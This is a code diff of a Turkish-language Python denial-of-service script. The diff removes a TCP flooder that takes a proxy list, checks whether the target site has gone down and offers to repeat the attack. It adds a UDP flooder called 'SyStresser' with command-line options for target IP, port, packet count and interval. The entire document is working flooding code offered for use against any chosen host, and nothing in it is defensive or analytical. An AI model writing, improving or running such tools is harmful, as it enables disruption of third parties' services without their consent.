@@ -1,79 +1,25 @@
 import socket
+import argparse
 import time
-import requests
 
-def send_packets(host, port, packet_count, proxy_list=None):
-    if proxy_list is None:
-        # Socket oluştur
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
-        s.connect((host, port))
-        
-        # Paketleri gönder
-        start_time = time.time()
-        data = b'PAKET'* packet_count
-        s.sendall(data)
-        end_time = time.time()
-        sending_time = end_time - start_time
-        
-        # Bağlantıyı kapat
-        s.close()
-        print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
-    else:
-        for proxy in proxy_list:
-            # Proxy'nin canlı olup olmadığını kontrol et
-            try:
-                response = requests.get("http://" + proxy, timeout=5)
-                if response.status_code != 200:
-                    print(proxy + " KAPALI")
-                    continue
-            except:
-                print(proxy + " KAPALI")
-                continue
+def attack(ip, port, paket_sayisi, saniye):
+    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sayac = 0
+    while True:
+        udp.sendto(b"Packet", (ip, port))
+        sayac += 1
+        print("Gönderilen paket sayısı: ", sayac)
+        if sayac == paket_sayisi:
+            break
+        time.sleep(saniye)
+    udp.close()
 
-            # Socket oluştur
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+parser = argparse.ArgumentParser(description="SyStresser")
+parser.add_argument("-u", "--url", dest="ip", help="Hedef IP adresi")
+parser.add_argument("-p", "--port", dest="port", type=int, help="Hedef port")
+parser.add_argument("-n", "--number", dest="paket_sayisi", type=int, help="Gönderilecek paket sayısı")
+parser.add_argument("-s", "--seconds", dest="saniye", type=int, help="Gönderim arasındaki süre (saniye)")
 
-            # Proxy kullanmak için bağlantı yap
-            s.settimeout(10)
-            s.connect((proxy, port))
+args = parser.parse_args()
 
-            # Paketleri gönder
-            start_time = time.time()
-            data = b'PAKET'* packet_count
-            s.sendall(data)
-            end_time = time.time()
-            sending_time = end_time - start_time
-
-            # Bağlantıyı kapat
-            s.close()
-            print("Gönderme hızı: ", packet_count/sending_time, " paket/s")
-    try:
-        response = requests.get(host)
-        if response.status_code == 200:
-            print("Site hala aktif")
-            repeat_attack = input("Tekrar saldırı yapılsın mı? (yes/no)")
-            if repeat_attack.lower() == 'yes':
-                send_packets(host, port, packet_count, proxy_list)
-            else:
-                print("Saldırı iptal edildi")
-        else:
-            print("Site kapandı")
-       except:
-        print("Siteye ulaşılamadı")
-
-host = input("Hedef website adresi: ")
-port = int(input("Hedef port numarası: "))
-packet_count = int(input("Gönderilecek paket sayısı: "))
-
-proxy_source = input("Kullanıcının proxy listesini belirtmek ister misiniz? (yes/no)")
-if proxy_source.lower() == 'yes':
-    proxy_file = input("Proxy listesini içeren txt dosyasının adını giriniz: ")
-    with open(proxy_file, 'r') as f:
-        proxy_list = f.read().splitlines()
-else:
-    proxy_list = None
-
-send_packets(host, port, packet_count, proxy_list)
-print("Saldırı başarılı")
-
+attack(args.ip, args.port, args.paket_sayisi, args.saniye)
